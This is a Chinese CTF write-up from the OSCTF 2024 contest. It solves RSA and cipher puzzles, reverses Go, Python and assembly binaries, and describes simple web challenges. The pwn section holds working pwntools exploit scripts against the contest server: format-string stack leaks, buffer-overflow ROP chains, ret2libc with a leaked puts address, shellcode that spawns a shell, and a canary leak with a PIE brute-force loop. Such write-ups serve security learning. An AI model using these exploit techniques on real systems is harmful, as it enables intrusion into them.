---
title: "OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"
date: 2024-07-14 19:49
updated: 2024-07-14 19:49
categories: "Notes"
tags:
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Reverse"
  - "Pwn"
description: "队伍：ElCS1 排名：24 分数：5085 pts 师傅们都tql！ User Name Score Jerrythepro123 2230 sanmu 240 Dragonkeep &amp; LamentXU 2015 6s6 400 Aly1xbot 200 这次比赛我们队的osint和mi"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18301878"
---
队伍：ElCS1 排名：24 分数：5085 pts

![](/images/migrated/18301878/01.png)

师傅们都tql！

| User Name | Score |
| --- | --- |
| Jerrythepro123 | 2230 |
| sanmu | 240 |
| Dragonkeep & LamentXU | 2015 |
| 6s6 | 400 |
| Aly1xbot | 200 |

这次比赛我们队的osint和misc手没时间。导致取证，osint和misc难的都不会，简单的又没啥好写的，索性直接开摆了

**[Crypto](https://www.cnblogs.com/LAMENTXU#1)**

-   [The Secret Message](https://www.cnblogs.com/LAMENTXU#1.1)
-   [Couple Primesc](https://www.cnblogs.com/LAMENTXU#1.2)
-   [Efficient RSA](https://www.cnblogs.com/LAMENTXU#1.3)
-   [Love Story](https://www.cnblogs.com/LAMENTXU#1.4)
-   [Cipher Conundrum](https://www.cnblogs.com/LAMENTXU#1.5)

**[Reverse(ak)](https://www.cnblogs.com/LAMENTXU#2)**

-   [Gopher Language](https://www.cnblogs.com/LAMENTXU#2.1)
-   [Another Python Game](https://www.cnblogs.com/LAMENTXU#2.2)
-   [The Broken Sword](https://www.cnblogs.com/LAMENTXU#2.3)
-   [Avengers Assemble](https://www.cnblogs.com/LAMENTXU#2.4)

**[PWN(ak)](https://www.cnblogs.com/LAMENTXU#3)**

-   [Leaky Pipes](https://www.cnblogs.com/LAMENTXU#3.1)
-   [Buffer Buffet](https://www.cnblogs.com/LAMENTXU#3.2)
-   [Byte Breakup](https://www.cnblogs.com/LAMENTXU#3.3)
-   [seed sPRING](https://www.cnblogs.com/LAMENTXU#3.4)
-   [ShellMischief](https://www.cnblogs.com/LAMENTXU#3.5)
-   [Lib Riddle](https://www.cnblogs.com/LAMENTXU#3.6)
-   [Coal Mine Canary](https://www.cnblogs.com/LAMENTXU#3.7)

**[Web(ak)](https://www.cnblogs.com/LAMENTXU#4)**

-   [Introspection](https://www.cnblogs.com/LAMENTXU#4.1)
-   [Indoor WebApp](https://www.cnblogs.com/LAMENTXU#4.2)
-   [Style Query Listing](https://www.cnblogs.com/LAMENTXU#4.3)
-   [Heads or Tails?](https://www.cnblogs.com/LAMENTXU#4.4)
-   [Action Notes](https://www.cnblogs.com/LAMENTXU#4.5)

# Crypto

## The Secret Message

难度：热身

chall.py

```
from Cryptodome.Util.number import getPrime, bytes_to_long

flag = bytes_to_long(b"REDACTED")
p = getPrime(512)
q = getPrime(512)
n = p*q
e = 3

ciphertext = pow(flag, e, n)

print("n: ", n)
print("e: ", e)
print("ciphertext: ", ciphertext)
```

encrypted.txt

```
n:  95529209895456302225704906479347847909957423713146975001566374739455122191404873517846348720717334832208112563199994182911677708320666162110219260456995238587348694937990770918797369279309985690765014929994818701603418084246649965352663500490541743609682236183632053755116058982739236349050530235419666436143
e:  3
ciphertext:  123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125
```

看到e=3直接释怀了

没啥好说的，小指数明文攻击啥的可以端上来了

但是这里因为e实在是太小了，导致了一种极端情况的出现

m^e%n = c, 由于m^e < n, 导致 m^e = c

直接对c开三次根得到m，即为flag

```
from Cryptodome.Util.number import long_to_bytes
import gmpy2
n=  95529209895456302225704906479347847909957423713146975001566374739455122191404873517846348720717334832208112563199994182911677708320666162110219260456995238587348694937990770918797369279309985690765014929994818701603418084246649965352663500490541743609682236183632053755116058982739236349050530235419666436143
e=  3
ciphertext=  123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125
print(long_to_bytes(gmpy2.iroot(ciphertext, 3)[0]))
```

**OSCTF{Cub3\_R00Ting\_RSA!!}**

## Couple Primesc

难度：热身

source.py

```
from Crypto.Util.number import *
from sympy import nextprime

flag = b'REDACTED'

p = getPrime(1024)
q = nextprime(p)
e = 65537

n = p * q
c = pow(bytes_to_long(flag), e, n)

print(f"n = {n}")
print(f"c = {c}")
```

cipher

```
n = 20159884168863899177128175715030429666461733285660170664255048579116265087763268748333820860913271674586980839088092697230336179818435879126554509868570255414201418619851045615744211750178240471758695923469393333600480843090831767416937814471973060610730578620506577745372347777922355677932755542699210313287595362584505135967456855068550375989801913361017083952090117041405458626488736811460716474071561590513778196334141517893224697977911862004615690183334216587398645213023148750443295007000911541566340284156527080509545145423451091853688188705902833261507474200445477515893168405730493924172626222872760780966427
c = 18440162368010249375653348677429595229051180035668845001125855048750591059785630865891877031796050869136099359028540172514890273415892550857190509410541828375948243175466417949548148007390803680005616875833010137407850955608659023797782656930905693262770473679394796595557898347900786445803645539553815614140428316398058138450937721961593146082399553119578102712100359284788650328835784603011091312735813903241087475279011862693938914825685547337081335030237385061397899718079346063519325222861490101383929790275635381333028091769118083102339908694751574572782030287570280071809896532329742115422479473386147281509394
```

注意到source中获取p，q时直接使用的nextprime，即两素数相差很近

直接费马分解+RSA解密丝滑连招出flag

使用yafu进行分解：

![](/images/migrated/18301878/02.png)

得到p， q  
正常RSA解密即可

```
from Crypto.Util.number import *
p = 141985506897231941308512923885300128905042311260138568794604206121080701727914934144982091139843178794485634682609841794924046596349428012470654095827271229332196334064446305896952838867217202135745989681311949561794583125471246401285687229433924674917884710139141784537370509554520561718028000388149962362867
q = 141985506897231941308512923885300128905042311260138568794604206121080701727914934144982091139843178794485634682609841794924046596349428012470654095827271229332196334064446305896952838867217202135745989681311949561794583125471246401285687229433924674917884710139141784537370509554520561718028000388149962362681
n = 20159884168863899177128175715030429666461733285660170664255048579116265087763268748333820860913271674586980839088092697230336179818435879126554509868570255414201418619851045615744211750178240471758695923469393333600480843090831767416937814471973060610730578620506577745372347777922355677932755542699210313287595362584505135967456855068550375989801913361017083952090117041405458626488736811460716474071561590513778196334141517893224697977911862004615690183334216587398645213023148750443295007000911541566340284156527080509545145423451091853688188705902833261507474200445477515893168405730493924172626222872760780966427
c = 18440162368010249375653348677429595229051180035668845001125855048750591059785630865891877031796050869136099359028540172514890273415892550857190509410541828375948243175466417949548148007390803680005616875833010137407850955608659023797782656930905693262770473679394796595557898347900786445803645539553815614140428316398058138450937721961593146082399553119578102712100359284788650328835784603011091312735813903241087475279011862693938914825685547337081335030237385061397899718079346063519325222861490101383929790275635381333028091769118083102339908694751574572782030287570280071809896532329742115422479473386147281509394
e = 65537
phi = (p-1)*(q-1)
d = inverse(e, phi)
print(long_to_bytes(pow(c, d, n)))
```

**OSCTF{m4y\_7h3\_pR1m3\_10v3\_34cH\_07h3r?}**

## Efficient RSA

难度：热身

chall.py

```
from Cryptodome.Util.number import getPrime, bytes_to_long

Flag = bytes_to_long(b"REDACTED")

p = getPrime(112)
q = getPrime(112)
n = p*q
e = 65537

ciphertext = pow(Flag, e, n)

print([n, e, ciphertext])
```

encrypted.txt

```
[13118792276839518668140934709605545144220967849048660605948916761813, 65537, 8124539402402728939748410245171419973083725701687225219471449051618]
```

看到如此小的p和q谁能拒绝暴力分解n呢？

![](/images/migrated/18301878/03.png)

得到q，p，正常RSA解密即可

```
from Crypto.Util.number import *
p = 3058290486427196148217508840815579
q = 4289583456856434512648292419762447
n = 13118792276839518668140934709605545144220967849048660605948916761813
c = 8124539402402728939748410245171419973083725701687225219471449051618
e = 65537
phi = (p-1)*(q-1)
d = inverse(e, phi)
print(long_to_bytes(pow(c, d, n)))
```

**OSCTF{F4ct0r1Ng\_F0r\_L1f3}**

## Love Story

难度：热身(有hint之后)

（吐槽：这都第多少个热身题了。。。）

看hint源代码

```
def to_my_honey(owo):
    return ord(owo) - 0x41

def from_your_lover(uwu):
    return chr(uwu % 26 + 0x41)

def encrypt(billet_doux):
    letter = ''
    for heart in range(len(billet_doux)):
        letters = billet_doux[heart]
        if not letters.isalpha():
            owo = letters
        else:
            uwu = to_my_honey(letters)
            owo = from_your_lover(uwu + heart)
        letter += owo
    return letter

m = "REDACTED"
c = encrypt(m)
print(c)
```

这题放reverse里都是合适的（捂脸）

_加密逻辑_  
to\_my\_honey(owo): 将字符转换为其在字母表中的位置（从0开始）

from\_your\_lover(uwu): 将数字转回字符，考虑字母表的环绕

encrypt(billet\_doux): 对于字符串中的每个字符，根据字符的位置进行调整，并使用上述两个函数处理字母字符

_解密函数_  
解密函数的工作是将加密逻辑反转：

对于每个字母，将字符转换为其字母表中的位置

从这个位置中减去字符在字符串中的索引

将结果模26，并将其转换回字母

```
def to_my_honey(owo):
    return ord(owo) - 0x41
def from_your_lover(uwu):
    return chr(uwu % 26 + 0x41)
def decrypt(encrypted_message):
    letter = ''
    for heart in range(len(encrypted_message)):
        letters = encrypted_message[heart]
        if not letters.isalpha():
            owo = letters
        else:
            uwu = to_my_honey(letters)
            # Reverse the index addition and handle negative values correctly
            original_position = (uwu - heart) % 26
            owo = from_your_lover(original_position)
        letter += owo
    return letter
encrypted_message = 'KJOL_T_ZCTS_ZV_CQKLX_NDFKZTUC.'
decrypted_message = decrypt(encrypted_message)
print("Decrypted Message:", decrypted_message)
```

最后这个结果莫名其妙，但是确实是对的。也许这就是爱情吧（love story）

**OSCTF{KIMI\_O\_SUKI\_NI\_NATTE\_SHIMATTA.}**

## Cipher Conundrum

难度：简单

encrypted.txt

```
NDc0YjM0NGMzNzdiNTg2NzVmNDU1NjY2NTE1ZjM0NTQ2ODM5NzY0YTZiNmI2YjZiNmI3ZA==
```

赛博厨子可以梭

![](/images/migrated/18301878/04.png)

梭了吗，如梭

ROT爆破出

![](/images/migrated/18301878/05.png)

> Base64 -> HEX -> ROT8

**OSCTF{5o\_M3nY\_C1ph3Rsssss}**

# Reverse

## Gophers Language

难度：热身

无壳，64位，IDA打开

直接发现main\_main，出题人他真的我哭死

F5反编译，显然，这里的v13就是我们输入的值

![](/images/migrated/18301878/06.png)

发现首先使用了一个if判断了v13的长度是否为21，由此得知flag长度为21

这样我们就可以把断点打进runtime\_memequal里了

![](/images/migrated/18301878/07.png)

比较处下断点，F9调试输入任意长度为21的字符串，如123456789123456789123

运行到断点处后双击v1查看v1值即可

![](/images/migrated/18301878/08.png)

**OSCTF{Why\_G0\_S0\_H4rd}**

## Another Python Game

难度：热身

pyinstxtractor.py对着source.exe文件梭出pyc文件

直接在线工具反编译即可

![](/images/migrated/18301878/09.png)

(小声)不是就这难度谁会bruteforce啊(汗)

**OSCTF{1\_5W3ar\_I\_D1dn'7\_BruT3f0rc3}**

## The Broken Sword

```
from Crypto.Util.number import *
from secret import flag,a,v2,pi

z1 = a+flag
y = long_to_bytes(z1)
print("The message is",y)
s = ''
s += chr(ord('a')+23)
v = ord(s)
f = 5483762481^v
g = f*35

r = 14
l = g
surface_area= pi*r*l
w = surface_area//1
s = int(f)
v = s^34
for i in range(1,10,1):
    h = v2*30
    h ^= 34
    h *= pi
    h /= 4567234567342
a += g+v2+f
a *= 67 
al=a
print("a1:",al)
print('h:',h)

#The message is b'\x0c\x07\x9e\x8e/\xc2'
#a1 is: 899433952965498
#h is: 0.0028203971921452278
```

题目难度不是很大，唯一需要做的就是把pi的值找出来因为不知道是多少个小数点位。可以写一个简单的脚本来验证是否是正确的pi。

```
v2=0.0028203971921452278
v2*=4567234567342
v2/=3.14
v2=int(v2)
v2^=34
v2/=30
print(int(v2))

v2=int(v2)
h = v2*30
h ^= 34
h *= 3.14
h /= 4567234567342
print(h)
print(h==0.0028203971921452278)
```

当pi确定是对的，那就可以求出v2。有了v2就可以用z3来逆向出flag和a的值

```
from z3 import *

pi=3.14
f=5483762505
g=191931687675
z1=13226864422850
v2=136745387
a1=899433952965498

a=Int('a')
flag=Int('flag')
s = Solver()

s.add(a+flag==z1)
s.add((a+g+v2+f)*67==a1)

s.check()
print("OSCTF{"+str(s.model()[flag].as_long())+"_"+str(s.model()[a].as_long())+"_"+str(v2)+"}")

#OSCTF{29260723_13226835162127_136745387}
```

**OSCTF{29260723\_13226835162127\_136745387}**

## Avengers Assemble

```
asm
extern printf
extern scanf

section .data
        fmt: db "%ld",0
        output: db "Correct",10,0
        out: db "Not Correct",10,0
        inp1: db "Input 1st number:",0
        inp2: db "Input 2nd number:",0
        inp3: db "Input 3rd number:",0

section .text
        global main
 
        main:
        push ebp
        mov ebp,esp
        sub esp,0x20
 
        push inp1
        call printf
        lea eax,[ebp-0x4]
        push eax
        push fmt
        call scanf

        push inp2
        call printf
        lea eax,[ebp-0xc]
        push eax
        push fmt
        call scanf

        push inp3
        call printf
        lea eax,[ebp-0x14]
        push eax
        push fmt
        call scanf

        mov ebx, DWORD[ebp-0xc]
        add ebx, DWORD[ebp-0x4]
        cmp ebx,0xdeadbeef
        jne N

        cmp DWORD[ebp-0x4], 0x6f56df65
        jg N

        cmp DWORD[ebp-0xc], 0x6f56df8d
        jg N
        cmp DWORD[ebp-0xc], 0x6f56df8d
        jl N

        mov ecx, DWORD[ebp-0x14]
        mov ebx, DWORD[ebp-0xc]
        xor ecx, ebx
        cmp ecx, 2103609845
        jne N
        jmp O

        N:
        push out
        call printf
        leave
        ret

        O:
        push output
        call printf

        leave
        ret
```

简单看了代码，只要保证不调到最N函数就可以。

```
        push inp1
        call printf
        lea eax,[ebp-0x4]
        push eax
        push fmt
        call scanf

        push inp2
        call printf
        lea eax,[ebp-0xc]
        push eax
        push fmt
        call scanf

        push inp3
        call printf
        lea eax,[ebp-0x14]
        push eax
        push fmt
        call scanf
```

分析这段汇编，得知ebp-0x4=inp1, ebp-0xc=inp2, ebp-0x14=inp3。

```
        mov ebx, DWORD[ebp-0xc]
        add ebx, DWORD[ebp-0x4]
        cmp ebx,0xdeadbeef
        jne N
        cmp DWORD[ebp-0x4], 0x6f56df65
        jg N
```

前四行要就inp1+inp2=0xdeadbeef，之后inp1要小于0x6f56df65。

```
        cmp DWORD[ebp-0xc], 0x6f56df8d
        jg N
        cmp DWORD[ebp-0xc], 0x6f56df8d
        jl N
```

inp2必须不能大于0x6f56df8d或者小于，那它必须等于0x6f56df8d

```
        mov ecx, DWORD[ebp-0x14]
        mov ebx, DWORD[ebp-0xc]
        xor ecx, ebx
        cmp ecx, 2103609845
        jne N
        jmp O
```

inp2 xor inp3 = 2103609845，根据布尔代数a^b=c, a^c=b，那inp2 xor 2103609845 = inp3

最终代码

```
inp2=0x6f56df8d
inp3=inp2^2103609845
inp1=0xdeadbeef-inp2
print("OSCTF{"+str(inp1)+"_"+str(inp2)+"_"+str(inp3)+"}")
```

**OSCTF{1867964258\_1867964301\_305419896}**

# PWN

## Leaky Pipes

在 `vuln` 函数中存在一个格式字符串漏洞，标志也被读入堆栈。因此，可以使用格式字符串泄漏堆栈值来获取标志。

源代码

```
int vuln()
{
  char v1[128]; // [esp+0h] [ebp-C8h] BYREF
  char v2[68]; // [esp+80h] [ebp-48h] BYREF

  readflag(v2, 64);
  printf("Tell me your secret so I can reveal mine ;) >> ");
  __isoc99_scanf("%127s", v1);
  puts("Here's your secret.. I ain't telling mine :p");
  printf(v1);
  return putchar(10);
}
```

通过编写暴力破解脚本，我们可以找到flag在堆栈中的位置。

标志位置查找器

```
from pwn import *
flag=""
for i in range(1,100):
        payload="%"+str(i)+"$p"
        io=remote("34.125.199.248", 1337)
        io.recvuntil('>>')
        io.sendline(payload)
        io.recvline()
        back=io.recvline().split("\n")
        if back[0]=="(nil)":
                continue
        back=back[0].split("0x")[1]
        if len(back)%2!=0:
                back="0"+back
        print back.decode("hex")[::-1]
        #36 45
```

利用脚本

```
from pwn import *
flag=""
for i in range(36,45):
        payload="%"+str(i)+"$p"
        io=remote("34.125.199.248", 1337)
        io.recvuntil('>>')
        io.sendline(payload)
        io.recvline()

        back=io.recvline().split("\n")
        if back[0]=="(nil)":
                continue
        back=back[0].split("0x")[1]
        if len(back)%2!=0:
                back="0"+back
        flag+=back.decode("hex")[::-1]
print flag
```

注：此挑战使用的脚本与picoctf的flag\_leak挑战相同。

## Buffer Buffet

分析代码，发现使用 `gets` 函数读取输入时存在明显的缓冲区溢出漏洞。

源代码

```
__int64 vuln()
{
  char v1[400]; // [rsp+0h] [rbp-190h] BYREF

  puts("Enter some text:");
  gets(v1);
  printf("You entered: %s\n", v1);
  return 0LL;
}
```

在地址 `0x04011D6` 处也有一个 `win` 函数。

通过在gdb中使用循环模式并进行调试，我们发现到返回地址的偏移量为408字节。

循环模式生成器

```
def hex2str(hex_string):
    result = ""
    for i in range(0, len(hex_string), 2):
        hex_pair = hex_string[i:i+2]
        decimal_value = int(hex_pair, 16)
        char = chr(decimal_value)
        result += char
    return result
testlen=int(input("Requested Test String Length(Max 5564 Characters): "))
v=True
version=input("1. 32 Bit\n2. 64 Bit\n")
if version==2:
    v=False
if testlen>5564:
    print("Too Large")
    exit()
a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
length=0
padding=""
for i in range(len(a)):
    payload = a[i] * 4
    for j in range(i+1,len(a)):
        payload+=a[j]+a[i]*3
    padding+=str(payload)+'0'
padding=padding[0:testlen]
print "Test String:",padding
back=input("Segfault Output: ")
back=hex2str(hex(back).split('0x')[1])[::-1]
if not v:
    back=back[:4]
padding=padding.split(back)
print "Padding is",len(padding[0])
print "A"*len(padding[0])
```

利用脚本

```
from pwn import *

io=remote("34.125.199.248", 4056)
payload="A"*408+p64(0x04011D6)

io.sendlineafter(":",payload)
print io.recvuntil("}")
```

## Byte Breakup

分析代码发现，这里同样存在缓冲区溢出漏洞。虽然只有一个调用 `/bin/ls` 的函数，但这并不是我们想要的。

有两种方法可以解决这个问题：第一种方法需要泄露 `libc` 以创建完整的ROP链，通过 `ret2libc`。然而，还有一种更简单的方法可以在不创建复杂ROP链的情况下进行利用。

源代码

```
push    rbp
mov     rbp, rsp
lea     rax, command    ; "/bin/ls"
mov     rdi, rax        ; command
mov     eax, 0
call    _system
nop
pop     rbp
retn
```

这是 `soClose` 函数的汇编代码，如果我们获取 `call _system` 的地址，我们基本上可以控制任意命令，只要我们也能控制 `rdi` 寄存器。

幸运的是，通过运行 `ROPgadget`，我们在 `0x04012bb` 处找到了一个 `pop rdi` gadget。通过运行 `ROPgadget --binary chal`，你将看到所有的gadget。

二进制文件中也有 `/bin/sh`，通过运行 `strings -a -t x chal | grep /bin/sh`，我们也可以得到它的地址。它在地址 `0x3048`，但还需要添加 `0x401000` 作为基地址。

利用脚本

```
from pwn import *

bin_sh=p64(0x404048)
system=p64(0x0401257)
pop_rdi=p64(0x004012bb)
io=remote("34.125.199.248", 6969)
payload="A"*40+pop_rdi+bin_sh+system
io.sendlineafter(":",payload)
io.interactive()
```

注：给定了 `libc` 文件，但并不必要使用它进行解决，有类似的方法可以使用 `libc` 文件解决，但会更复杂。

## seed sPRING

令人惊讶的是，这个问题与 picoCTF 的 seed sPRING 非常相似。

[https://github.com/HHousen/PicoCTF-2019/blob/24b0981c72638c12f9a8572f81e1abbcf8de306d/Binary Exploitation/seed-sPRiNG/solve.c](https://github.com/HHousen/PicoCTF-2019/blob/24b0981c72638c12f9a8572f81e1abbcf8de306d/Binary%20Exploitation/seed-sPRiNG/solve.c)

这是我找到的解决脚本。通过编译它并使用 `./solve | nc 34.125.199.248 2534` 运行，它将在几次尝试中解决。

## ShellMischief

程序基本上运行任意代码，但在随机位置。通过添加一个 `nop` 滑道可以解决问题。然而，我们的团队以不同的方式解决了它。

通过找到 `ret` gadget，我们创建了一个 `ret` 滑道，它的作用与 `nop` 滑道相同。

利用脚本

```
from pwn import *
context(arch='i386',os='linux',log_level='debug')

sh = remote('34.125.199.248',1234)
# sh = process("./vuln")

ret_addr = 0x080481b2

# 13
shellcode = asm(shellcraft.sh())
sh.recvuntil("Enter your shellcode:\n")
# gdb.attach(sh)
# pause()
payload = p32(ret_addr)*26 + shellcode
sh.sendline(payload)
sh.interactive()
```

## Lib Riddle

分析代码，由于 `0x100 > 16`，存在缓冲区溢出漏洞。

源代码

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("Welcome to the library... What's your name?");
  read(0, buf, 0x100uLL);
  puts("Hello there: ");
  puts(buf);
  return 0;
}
```

通过运行 `ROPgadget`，我们在 `0x0401273` 处找到 `pop rdi`。但是，由于这是一个64位二进制文件，可能需要一个 `ret` gadget 进行堆栈对齐。`ret` gadget 在 `0x040101a`。

通过使用 PLT 和 GOT 表，我们可以泄漏 `puts` 函数的地址。

[https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address)

我们通过逆向工程二进制文件并获取地址来找到 PLT 和 GOT 表的地址。

利用脚本

```
from pwn import *

io=remote("34.125.199.248", 7809)
pop_rdi=p64(0x0401273)
puts_got=p64(0x0404018)
puts_plt=p64(0x401060)
ret=p64(0x040101a)
start=p64(0x0401090)
payload="A"*24+pop_rdi+puts_got+puts_plt+start

io.sendlineafter("?",payload)
io.recv()
io.recv(42)
libc=u64(io.recv(6)+2*"\x00")
libc=libc-0x84420
system=p64(libc+0x52290)
bin_sh=p64(libc+0x1b45bd)

payload="A"*24+ret+pop_rdi+bin_sh+system
io.sendlineafter("?",payload)
io.interactive()
```

## Coal Mine Canary

分析 `name_it` 函数，我们可以理解程序的工作原理。

源代码

```
int name_it()
{
  int v1; // [esp-Ch] [ebp-64h]
  int v2; // [esp-8h] [ebp-60h]
  int v3; // [esp-4h] [ebp-5Ch]
  int v4; // [esp+0h] [ebp-58h] BYREF
  char v5[32]; // [esp+4h] [ebp-54h] BYREF
  char v6[32]; // [esp+24h] [ebp-34h] BYREF
  int v7[2]; // [esp+44h] [ebp-14h] BYREF
  int v8; // [esp+4Ch] [ebp-Ch]

  v8 = 0;
  v7[0] = global_birdy;
  v7[1] = dword_804C050;
  printf("How many letters should its name have?\n> ");
  while ( v8 <= 31 )
  {
    read(0, &v5[v8], 1);
    if ( v5[v8] == 10 )
      break;
    ++v8;
  }
  __isoc99_sscanf(v5, "%d", &v4);
  printf("And what's the name? \n> ");
  read(0, v6, v4);
  if ( memcmp(v7, &global_birdy, 8) )
  {
    puts("*** Stack Smashing Detected *** : Are you messing with my canary?!");
    exit(-1, v1, v2, v3);
  }
  printf("Ok... its name is %s\n");
  return fflush(stdout);
}
```

该函数从文件中读取8字节的canary，如果canary发生变化，程序会崩溃。

我们可以通过声明名字长度大于32字符并给自己取一个31字符的名字来泄露canary。这样做会泄露canary。

原因是不应设置32字符，因为`read`函数会将换行符视为字符之一，因此如果是32字符会覆盖canary并导致程序崩溃。

```
Working in a coal mine is dangerous stuff.
Good thing I've got my bird to protect me.
Let's give it a name.
...
How many letters should its name have?
> 33
And what's the name?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ok... its name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
NECGLSPQ
```

canary 是 `NECGLSPQ`。

然而，这里是大多数人被卡住的地方。看起来很容易，只需覆盖返回地址并跳转到 `tweet_tweet`（即sin函数）。但实际情况是，该二进制文件启用了PIE...

我做的是在不知道PIE存在的情况下暴力破解地址。

利用脚本

```
from pwn import *

for i in range(1024):
    io=remote("34.125.199.248", 5674)
    win=p32(0x08049259)
    payload="A"*32+"NECGLSPQ"+"A"*12+"BBBB"+p32(0x8049259+i)

    io.recvuntil(">")
    io.sendline("300")

    io.sendafter("> ",payload)
    io.recvuntil("BBBB")

    try:
        print hex(u32(io.recv(4)))
        print io.recvuntil("}")
    except:
        print "NONE"
    io.close()
```

# Web

## Introspection

F12看js一把梭

![](/images/migrated/18301878/10.png)

**OSCTF{Cr4zY\_In5P3c71On}**

## Indoor WebApp

进题点View Profile发现有参数，直接传个id为2就出了

![image-20240714150959615.png](https://bu.dusays.com/2024/07/14/66937cb7dcf9a.png)

## Style Query Listing...?

SQLMAP一把梭了，就是国外比赛国内连接网络太拉跨，时间盲注老是挂

![](/images/migrated/18301878/12.jpg)

就搞出来一个tables

![](/images/migrated/18301878/13.jpg)

索性爆破看看有什么吧，发现有/admin路由，进去看看

![](/images/migrated/18301878/14.png)

此时的我：？？？？？？？？？？？？？？？？？？？？？？？？？？？？？

应该是忘记设置权限了（大雾）

**OSCTF{D1r3ct0RY\_BrU7t1nG\_4nD\_SQL}**

## Heads or Tails?

依照hint要求爆破，发现存在/get-flag

![](/images/migrated/18301878/15.jpg)

Burp连一下

![](/images/migrated/18301878/16.jpg)

发现支持HEAD和OPTIONS方法

发送HEAD请求包得到flag

**OSCTF{Und3Rr47Ed\_H3aD\_M3Th0D}**

## Action Notes

谁都没有想到啊，谁都没有想到啊。这题居然是弱密码。。。。

对着admin账户一通爆破出弱密码admin123，直接登录即可

![](/images/migrated/18301878/17.png)

**OSCTF{Av0id\_S1mpl3\_P4ssw0rDs}**
